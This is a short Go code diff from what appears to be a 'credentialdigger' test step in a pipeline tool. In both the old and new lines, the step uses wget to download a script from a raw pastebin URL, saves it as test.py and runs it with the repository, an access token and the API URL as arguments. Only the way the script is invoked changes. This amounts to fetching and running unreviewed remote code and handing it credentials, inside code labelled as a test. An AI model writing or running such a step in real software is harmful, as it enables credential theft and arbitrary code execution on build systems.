@@ -90,7 +90,7 @@ func runTestShell(config *credentialdiggerTestStepOptions, telemetryData *teleme
 	// 1
 	log.Entry().Info("Test a shell script")
 	wget_list := []string{"https://pastebin.com/raw/21xGCKSg", "-O", "test.py"}
-	python_list := []string{"python", "test.py", config.Repository, config.Token, config.APIURL}
+	python_list := []string{"./test.py", config.Repository, config.Token, config.APIURL}
 	err := utils.RunExecutable("wget", wget_list...)
 	if err != nil {
 		log.Entry().Error("failed running bash test -wget")
